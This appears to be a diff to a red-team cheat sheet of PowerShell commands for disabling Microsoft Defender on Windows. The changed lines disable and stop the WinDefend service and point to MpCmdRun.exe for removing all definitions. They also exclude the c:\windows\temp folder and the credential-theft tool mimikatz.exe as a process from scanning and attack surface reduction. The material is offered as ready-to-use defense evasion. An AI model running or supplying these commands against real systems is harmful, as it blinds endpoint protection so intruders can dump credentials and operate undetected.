@@ -57,10 +57,11 @@ Get-MpPreference | Select-Object  -Property ExclusionExtension
 
 ## Defender - stop service
 ```powershell
-(Get-Service windefend).stop
+sc.exe config WinDefend start= disabled; (Get-Service windefend).stop
 ```
 
 ## Defender - Remove signatures (if Internet connection is present, they will be downloaded again)
+%ProgramFiles%\Windows Defender\MpCmdRun.exe
 ```powershell
 .\MpCmdRun.exe -RemoveDefinitions -All
 ```
@@ -93,9 +94,19 @@ Set-MpPreference -DisableScriptScanning $true
 
 ## Defender - Add path to exclusions
 ```powershell
-$p = "<path|c:\temp\mimikatz.exe>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
+$p = "<path|c:\windows\temp>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
 ```
 
+
+## Defender - Add process to exclusions (1)
+```powershell
+$p = "<path|c:\windows\temp\mimikatz.exe>" ; Add-MpPreference -ExclusionProcess $p -AttackSurfaceReductionOnlyExclusions $p
+```
+
+## Defender - Add process to exclusions (2)
+```powershell
+$p = "<binary|mimikatz.exe>" ; Add-MpPreference -ExclusionProcess $p -AttackSurfaceReductionOnlyExclusions $p
+```
 
 ## Defender - Add extension to exclusions
 ```powershell
